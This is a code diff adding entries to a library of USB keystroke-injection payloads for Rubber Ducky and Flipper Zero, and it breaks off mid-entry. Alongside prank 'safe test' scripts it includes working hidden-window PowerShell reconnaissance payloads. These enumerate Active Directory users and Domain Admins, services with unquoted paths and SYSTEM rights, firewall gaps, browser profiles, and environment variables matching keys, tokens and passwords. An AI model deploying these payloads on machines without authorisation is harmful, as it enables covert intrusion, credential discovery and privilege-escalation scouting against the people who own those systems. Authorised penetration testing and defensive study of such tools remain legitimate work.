@@ -2357,5 +2357,1793 @@ ENTER
 DELAY 2000
 STRING exit
 ENTER`
+  },
+
+  // ==================== TEST (Safe/Fun Payloads) ====================
+  {
+    id: 'test-rickroll',
+    name: 'Rick Roll',
+    category: 'test',
+    description: 'Opens the classic Never Gonna Give You Up video in the default browser. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~3s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Rick Roll - Safe Test Payload
+REM Opens Never Gonna Give You Up
+DELAY 1000
+GUI r
+DELAY 500
+STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
+ENTER`
+  },
+  {
+    id: 'test-rickroll-flipper',
+    name: 'Rick Roll (Flipper)',
+    category: 'test',
+    description: 'Flipper Zero version - Opens the classic Rick Roll video. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~3s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    flipperCompat: true,
+    script: `REM Rick Roll - Safe Test Payload (Flipper)
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+DELAY 1000
+GUI r
+DELAY 500
+STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
+ENTER`
+  },
+  {
+    id: 'test-amongus',
+    name: 'Among Us Twerking',
+    category: 'test',
+    description: 'Opens the Among Us twerking meme video. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~3s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Among Us Twerking - Safe Test
+DELAY 1000
+GUI r
+DELAY 500
+STRING https://www.youtube.com/watch?v=hBe0LIB_Bxg
+ENTER`
+  },
+  {
+    id: 'test-amongus-flipper',
+    name: 'Among Us Twerking (Flipper)',
+    category: 'test',
+    description: 'Flipper Zero version - Opens the Among Us twerking meme. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~3s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    flipperCompat: true,
+    script: `REM Among Us Twerking - Safe Test (Flipper)
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+DELAY 1000
+GUI r
+DELAY 500
+STRING https://www.youtube.com/watch?v=hBe0LIB_Bxg
+ENTER`
+  },
+  {
+    id: 'test-notepad-message',
+    name: 'Desktop Notepad Message',
+    category: 'test',
+    description: 'Opens Notepad and types a funny security awareness message. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~8s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Notepad Surprise - Safe Test
+DELAY 1000
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 800
+STRING ========================================
+ENTER
+STRING   YOUR COMPUTER HAS BEEN HACKED!
+ENTER
+STRING          (just kidding)
+ENTER
+STRING ========================================
+ENTER
+ENTER
+STRING   This was a security awareness demo.
+ENTER
+STRING   Your IT team wants you to know:
+ENTER
+STRING   - Never plug in unknown USB devices
+ENTER
+STRING   - Always lock your workstation
+ENTER
+STRING   - Report suspicious devices to IT
+ENTER
+ENTER
+STRING   Stay safe out there!
+ENTER
+STRING   - The GOAT Security Team`
+  },
+  {
+    id: 'test-notepad-message-flipper',
+    name: 'Desktop Notepad Message (Flipper)',
+    category: 'test',
+    description: 'Flipper Zero version - Opens Notepad with a security awareness message. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~10s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    flipperCompat: true,
+    script: `REM Notepad Surprise - Safe Test (Flipper)
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+DELAY 1000
+GUI r
+DELAY 500
+STRING notepad
+ENTER
+DELAY 800
+STRING ========================================
+ENTER
+STRING   YOUR COMPUTER HAS BEEN HACKED!
+ENTER
+STRING          (just kidding)
+ENTER
+STRING ========================================
+ENTER
+ENTER
+STRING   This was a security awareness demo.
+ENTER
+STRING   Your IT team wants you to know:
+ENTER
+STRING   - Never plug in unknown USB devices
+ENTER
+STRING   - Always lock your workstation
+ENTER
+STRING   - Report suspicious devices to IT
+ENTER
+ENTER
+STRING   Stay safe out there!
+ENTER
+STRING   - The GOAT Security Team`
+  },
+  {
+    id: 'test-voice-tts',
+    name: 'Voice Message (Windows TTS)',
+    category: 'test',
+    description: 'Uses Windows text-to-speech to speak a funny security awareness message. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~12s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Text-to-Speech Surprise - Safe Test
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Attention. Your computer has been compromised. Just kidding. But you should really lock your workstation when you walk away. Have a nice day.')"
+ENTER`
+  },
+  {
+    id: 'test-voice-tts-flipper',
+    name: 'Voice Message (Flipper)',
+    category: 'test',
+    description: 'Flipper Zero version - Makes the computer speak a security awareness message via TTS. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~12s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    flipperCompat: true,
+    script: `REM Text-to-Speech Surprise - Safe Test (Flipper)
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Attention. Your computer has been compromised. Just kidding. But you should really lock your workstation when you walk away. Have a nice day.')"
+ENTER`
+  },
+  {
+    id: 'test-wallpaper-prank',
+    name: 'Wallpaper Prank (Frozen Desktop)',
+    category: 'test',
+    description: 'Takes a screenshot and sets it as the wallpaper so everything looks normal but nothing is clickable. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~5s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Frozen Desktop Prank - Safe Test
+REM Takes screenshot, sets as wallpaper, hides icons
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height); $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save(\\"$env:TEMP\\\\frozen.bmp\\"); Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\\"user32.dll\\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, \\"$env:TEMP\\\\frozen.bmp\\", 3)"
+ENTER`
+  },
+  {
+    id: 'test-matrix-rain',
+    name: 'Matrix Rain',
+    category: 'test',
+    description: 'Opens PowerShell with green Matrix-style falling characters animation. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~4s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Matrix Rain - Safe Test
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 800
+STRING $host.UI.RawUI.BackgroundColor='Black';$host.UI.RawUI.ForegroundColor='Green';Clear-Host;$w=$host.UI.RawUI.WindowSize.Width;while($true){$r='';1..$w|%{$r+=if((Get-Random -Max 2)){[char](Get-Random -Min 33 -Max 126)}else{' '}};Write-Host $r -NoNewline;Start-Sleep -Milliseconds 50}
+ENTER`
+  },
+  {
+    id: 'test-matrix-rain-flipper',
+    name: 'Matrix Rain (Flipper)',
+    category: 'test',
+    description: 'Flipper Zero version - Green Matrix-style falling characters in PowerShell. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~5s',
+    detectionDifficulty: 'easy',
+    format: 'flipper',
+    flipperCompat: true,
+    script: `REM Matrix Rain - Safe Test (Flipper)
+DEFAULT_DELAY 20
+WAIT_FOR_BUTTON_PRESS
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 800
+STRING $host.UI.RawUI.BackgroundColor='Black';$host.UI.RawUI.ForegroundColor='Green';Clear-Host;$w=$host.UI.RawUI.WindowSize.Width;while($true){$r='';1..$w|%{$r+=if((Get-Random -Max 2)){[char](Get-Random -Min 33 -Max 126)}else{' '}};Write-Host $r -NoNewline;Start-Sleep -Milliseconds 50}
+ENTER`
+  },
+  {
+    id: 'test-fake-update',
+    name: 'Fake Windows Update',
+    category: 'test',
+    description: 'Opens a full-screen fake Windows Update screen in the browser. Press F11 or Esc to exit. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~5s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Fake Windows Update - Safe Test
+DELAY 1000
+GUI r
+DELAY 500
+STRING https://fakeupdate.net/win10ue/
+ENTER
+DELAY 2000
+F11`
+  },
+  {
+    id: 'test-mouse-jiggler',
+    name: 'Mouse Jiggler',
+    category: 'test',
+    description: 'Moves the mouse by 1 pixel every 30 seconds to prevent screen lock. Close PowerShell to stop. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~3s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Mouse Jiggler - Safe Test
+REM Prevents screen lock by jiggling mouse
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((([System.Windows.Forms.Cursor]::Position.X)+1),([System.Windows.Forms.Cursor]::Position.Y)); Start-Sleep -Milliseconds 30000; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((([System.Windows.Forms.Cursor]::Position.X)-1),([System.Windows.Forms.Cursor]::Position.Y)); Start-Sleep -Milliseconds 30000}"
+ENTER`
+  },
+  {
+    id: 'test-capslock-rave',
+    name: 'Caps Lock Rave',
+    category: 'test',
+    description: 'Toggles Caps Lock rapidly 100 times making the keyboard LED flash like a rave. Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~12s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Caps Lock Rave - Safe Test
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -Command "Add-Type -AssemblyName System.Windows.Forms; 1..100 | ForEach-Object { [System.Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}'); Start-Sleep -Milliseconds 100 }"
+ENTER`
+  },
+  {
+    id: 'test-icon-shuffle',
+    name: 'Desktop Icon Shuffle',
+    category: 'test',
+    description: 'Pops up a funny message claiming desktop icons were shuffled (they were not). Safe test payload - no system changes.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~3s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Icon Shuffle - Safe Test
+REM Just opens a funny message, doesn't actually move icons
+DELAY 1000
+GUI r
+DELAY 500
+STRING mshta "javascript:var sh=new ActiveXObject('WScript.Shell');sh.Popup('Your desktop icons have been shuffled!\\n\\n(Not really, but imagine if they were)\\n\\nLock your workstation next time!',10,'Security Awareness',48);close()"
+ENTER`
+  },
+
+  // ==================== RECON — PROFESSIONAL PENTEST ====================
+  {
+    id: 'recon-full-network',
+    name: 'Full Network Reconnaissance',
+    category: 'recon',
+    description: 'Comprehensive network recon: ipconfig, ARP table, routing, netstat, DNS cache. Timestamped output saved to temp folder.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~15s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Full Network Reconnaissance
+REM Gathers ipconfig, ARP, routes, netstat, DNS cache
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\recon_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"; "=== SYSTEM ===" | Out-File $out; systeminfo | Out-File $out -Append; "=== NETWORK ===" | Out-File $out -Append; ipconfig /all | Out-File $out -Append; "=== ARP ===" | Out-File $out -Append; arp -a | Out-File $out -Append; "=== ROUTES ===" | Out-File $out -Append; route print | Out-File $out -Append; "=== NETSTAT ===" | Out-File $out -Append; netstat -ano | Out-File $out -Append; "=== DNS CACHE ===" | Out-File $out -Append; ipconfig /displaydns | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'recon-ad-enum',
+    name: 'Active Directory Enumeration',
+    category: 'recon',
+    description: 'Enumerates Active Directory domain info: domain controllers, users, groups, Domain Admins membership, and trust relationships. Requires domain-joined machine.',
+    targetOS: ['windows'],
+    riskLevel: 'medium',
+    executionTime: '~20s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM AD Enumeration - requires domain-joined machine
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\ad_enum.txt"; "=== DOMAIN INFO ===" | Out-File $out; try { nltest /dsgetdc: | Out-File $out -Append } catch { "nltest failed" | Out-File $out -Append }; "=== CURRENT USER ===" | Out-File $out -Append; whoami /all | Out-File $out -Append; "=== DOMAIN USERS ===" | Out-File $out -Append; try { net user /domain | Out-File $out -Append } catch { "Not domain joined" | Out-File $out -Append }; "=== DOMAIN GROUPS ===" | Out-File $out -Append; try { net group /domain | Out-File $out -Append } catch { "Failed" | Out-File $out -Append }; "=== DOMAIN ADMINS ===" | Out-File $out -Append; try { net group "Domain Admins" /domain | Out-File $out -Append } catch { "Failed" | Out-File $out -Append }; "=== TRUSTS ===" | Out-File $out -Append; try { nltest /domain_trusts | Out-File $out -Append } catch { "Failed" | Out-File $out -Append }; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'recon-installed-software-full',
+    name: 'Full Installed Software Inventory',
+    category: 'recon',
+    description: 'Enumerates all installed software from both 32-bit and 64-bit registry hives plus Windows Store apps. Includes version, publisher, install date, and install location.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~10s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Full Installed Software Inventory
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\software_inventory.txt"; "=== 64-BIT SOFTWARE ===" | Out-File $out; Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== 32-BIT SOFTWARE ===" | Out-File $out -Append; Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Where-Object { $_.DisplayName } | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== WINDOWS STORE APPS ===" | Out-File $out -Append; Get-AppxPackage | Select-Object Name, Version, Publisher | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'recon-process-dump',
+    name: 'Running Processes Deep Dump',
+    category: 'recon',
+    description: 'Dumps all running processes with PID, parent PID, executable path, owner, command line, and memory usage. Useful for identifying security software and attack surface.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~8s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Running Processes Deep Dump
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\processes.txt"; "=== RUNNING PROCESSES ===" | Out-File $out; Get-WmiObject Win32_Process | Select-Object ProcessId, ParentProcessId, Name, ExecutablePath, CommandLine, @{N='Owner';E={$_.GetOwner().User}}, @{N='MemMB';E={[math]::Round($_.WorkingSetSize/1MB,2)}} | Sort-Object Name | Format-List | Out-String -Width 300 | Out-File $out -Append; "=== PROCESS TREE ===" | Out-File $out -Append; Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'recon-scheduled-tasks',
+    name: 'Scheduled Tasks Dump',
+    category: 'recon',
+    description: 'Enumerates all scheduled tasks with their triggers, actions, run-as accounts, and status. Identifies potential persistence mechanisms and attack surface.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~12s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Scheduled Tasks Full Dump
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\schtasks.txt"; "=== ALL SCHEDULED TASKS ===" | Out-File $out; Get-ScheduledTask | ForEach-Object { $task = $_; $info = $_ | Get-ScheduledTaskInfo -ErrorAction SilentlyContinue; [PSCustomObject]@{ Name=$task.TaskName; Path=$task.TaskPath; State=$task.State; Author=$task.Author; RunAs=$task.Principal.UserId; Actions=($task.Actions | ForEach-Object { $_.Execute + ' ' + $_.Arguments }) -join '; '; Triggers=($task.Triggers | ForEach-Object { $_.ToString() }) -join '; '; LastRun=$info.LastRunTime; NextRun=$info.NextRunTime } } | Format-List | Out-String -Width 300 | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'recon-services-enum',
+    name: 'Windows Services Enumeration',
+    category: 'recon',
+    description: 'Enumerates all Windows services including state, start type, binary path, and service account. Identifies services running as SYSTEM and those with unquoted paths.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~8s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Windows Services Enumeration
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\services.txt"; "=== ALL SERVICES ===" | Out-File $out; Get-WmiObject Win32_Service | Select-Object Name, DisplayName, State, StartMode, PathName, StartName | Sort-Object State, Name | Format-Table -AutoSize | Out-String -Width 300 | Out-File $out -Append; "=== UNQUOTED SERVICE PATHS ===" | Out-File $out -Append; Get-WmiObject Win32_Service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' -and $_.PathName -notlike 'C:\\Windows\\*' } | Select-Object Name, PathName, StartName | Format-Table -AutoSize | Out-String -Width 300 | Out-File $out -Append; "=== SERVICES RUNNING AS SYSTEM ===" | Out-File $out -Append; Get-WmiObject Win32_Service | Where-Object { $_.StartName -eq 'LocalSystem' -and $_.State -eq 'Running' } | Select-Object Name, PathName | Format-Table -AutoSize | Out-String -Width 300 | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'recon-firewall-rules',
+    name: 'Firewall Rules Export',
+    category: 'recon',
+    description: 'Exports all Windows Firewall rules including direction, action, port, protocol, and remote address. Identifies gaps in firewall coverage.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~10s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Firewall Rules Export
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\firewall_rules.txt"; "=== FIREWALL PROFILES ===" | Out-File $out; Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== INBOUND ALLOW RULES ===" | Out-File $out -Append; Get-NetFirewallRule -Direction Inbound -Action Allow -Enabled True | Select-Object DisplayName, Profile, @{N='Port';E={(Get-NetFirewallPortFilter -AssociatedNetFirewallRule $_).LocalPort}}, @{N='Protocol';E={(Get-NetFirewallPortFilter -AssociatedNetFirewallRule $_).Protocol}} | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== OUTBOUND BLOCK RULES ===" | Out-File $out -Append; Get-NetFirewallRule -Direction Outbound -Action Block -Enabled True | Select-Object DisplayName, Profile | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'recon-env-vars',
+    name: 'Environment Variables Dump',
+    category: 'recon',
+    description: 'Dumps all environment variables including PATH, potential credential leaks in variables like API_KEY, TOKEN, SECRET, PASSWORD. Checks both user and system scope.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~5s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Environment Variables Dump
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\env_vars.txt"; "=== ALL ENVIRONMENT VARIABLES ===" | Out-File $out; Get-ChildItem Env: | Sort-Object Name | Format-Table -AutoSize | Out-String -Width 300 | Out-File $out -Append; "=== PATH ENTRIES ===" | Out-File $out -Append; $env:PATH -split ';' | ForEach-Object { $p = $_; [PSCustomObject]@{Path=$p; Exists=(Test-Path $p); Writable=try{$t="$p\\test.tmp";[IO.File]::Create($t).Close();Remove-Item $t;$true}catch{$false}} } | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== POTENTIAL CREDENTIAL VARS ===" | Out-File $out -Append; Get-ChildItem Env: | Where-Object { $_.Name -match 'key|token|secret|pass|cred|api|auth' } | Format-Table -AutoSize | Out-String -Width 300 | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'recon-shares-drives',
+    name: 'Shared Folders & Mapped Drives',
+    category: 'recon',
+    description: 'Enumerates local shares, mapped network drives, and accessible network shares. Tests connectivity to discovered shares.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~12s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Shared Folders & Mapped Drives Recon
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\shares.txt"; "=== LOCAL SHARES ===" | Out-File $out; net share | Out-File $out -Append; "=== MAPPED DRIVES ===" | Out-File $out -Append; Get-PSDrive -PSProvider FileSystem | Select-Object Name, Root, Used, Free, @{N='UsedGB';E={[math]::Round($_.Used/1GB,2)}}, @{N='FreeGB';E={[math]::Round($_.Free/1GB,2)}} | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== NET USE ===" | Out-File $out -Append; net use | Out-File $out -Append; "=== SMB SHARES ON LOCAL ===" | Out-File $out -Append; Get-SmbShare -ErrorAction SilentlyContinue | Select-Object Name, Path, Description | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== RECENT NETWORK CONNECTIONS ===" | Out-File $out -Append; Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MountPoints2\\*' -ErrorAction SilentlyContinue | Select-Object PSChildName | Format-Table | Out-String | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'recon-security-policy',
+    name: 'Security Policy Dump',
+    category: 'recon',
+    description: 'Dumps local security policies: password policy, account lockout settings, audit policies, user rights assignments, and security options.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~10s',
+    detectionDifficulty: 'moderate',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Security Policy Dump
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\secpolicy.txt"; "=== PASSWORD POLICY ===" | Out-File $out; net accounts | Out-File $out -Append; "=== LOCAL SECURITY POLICY ===" | Out-File $out -Append; secedit /export /cfg "$env:TEMP\\secpol.cfg" /quiet 2>$null; if (Test-Path "$env:TEMP\\secpol.cfg") { Get-Content "$env:TEMP\\secpol.cfg" | Out-File $out -Append; Remove-Item "$env:TEMP\\secpol.cfg" }; "=== AUDIT POLICY ===" | Out-File $out -Append; auditpol /get /category:* | Out-File $out -Append; "=== LOCAL ADMINS ===" | Out-File $out -Append; net localgroup Administrators | Out-File $out -Append; "=== USER ACCOUNTS ===" | Out-File $out -Append; Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordRequired, PasswordLastSet | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'recon-usb-history',
+    name: 'USB Device History',
+    category: 'recon',
+    description: 'Enumerates all USB storage devices ever connected to the system from registry. Includes device name, serial number, first/last connect times.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~6s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM USB Device History
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\usb_history.txt"; "=== USB STORAGE DEVICES ===" | Out-File $out; Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\*\\*' -ErrorAction SilentlyContinue | Select-Object FriendlyName, HardwareID, Mfg, Service, ContainerID | Format-List | Out-String -Width 200 | Out-File $out -Append; "=== USB DEVICE CLASSES ===" | Out-File $out -Append; Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Enum\\USB\\*\\*' -ErrorAction SilentlyContinue | Select-Object DeviceDesc, HardwareID, Mfg | Where-Object { $_.DeviceDesc } | Format-List | Out-String -Width 200 | Out-File $out -Append; "=== PORTABLE DEVICES ===" | Out-File $out -Append; Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows Portable Devices\\Devices\\*' -ErrorAction SilentlyContinue | Select-Object FriendlyName, PSChildName | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'recon-browser-data',
+    name: 'Browser Data Reconnaissance',
+    category: 'recon',
+    description: 'Discovers installed browsers, their versions, profile locations, extensions, and bookmark file paths. Does not extract actual credentials.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~8s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Browser Data Reconnaissance
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $out = "$env:TEMP\\browser_recon.txt"; "=== INSTALLED BROWSERS ===" | Out-File $out; @('chrome','msedge','firefox','brave','opera') | ForEach-Object { $b=$_; $p=Get-Command $b -ErrorAction SilentlyContinue; if($p){"$b : $($p.Source)"} } | Out-File $out -Append; "=== CHROME PROFILES ===" | Out-File $out -Append; $cp = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data"; if(Test-Path $cp){ Get-ChildItem $cp -Directory | Where-Object {$_.Name -match '^(Default|Profile)'} | ForEach-Object { $_.FullName; Get-ChildItem "$($_.FullName)\\Extensions" -Directory -ErrorAction SilentlyContinue | Select-Object Name } } | Out-File $out -Append; "=== FIREFOX PROFILES ===" | Out-File $out -Append; $fp = "$env:APPDATA\\Mozilla\\Firefox\\Profiles"; if(Test-Path $fp){ Get-ChildItem $fp -Directory | Select-Object FullName } | Out-File $out -Append; "=== EDGE PROFILES ===" | Out-File $out -Append; $ep = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data"; if(Test-Path $ep){ Get-ChildItem $ep -Directory | Where-Object {$_.Name -match '^(Default|Profile)'} | Select-Object FullName } | Out-File $out -Append; "=== BOOKMARK FILES ===" | Out-File $out -Append; @("$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Bookmarks","$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Bookmarks") | Where-Object { Test-Path $_ } | ForEach-Object { "Found: $_" } | Out-File $out -Append; Invoke-Item $out
+ENTER`
+  },
+  {
+    id: 'recon-startup-programs',
+    name: 'Startup Programs Enumeration',
+    category: 'recon',
+    description: 'Enumerates all programs set to run at boot or login: registry Run keys (HKLM/HKCU), Startup folders, scheduled tasks at logon, and services set to auto-start.',
+    targetOS: ['windows'],
+    riskLevel: 'low',
+    executionTime: '~8s',
+    detectionDifficulty: 'easy',
+    format: 'ducky',
+    flipperCompat: true,
+    script: `REM Startup Programs Enumeration
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
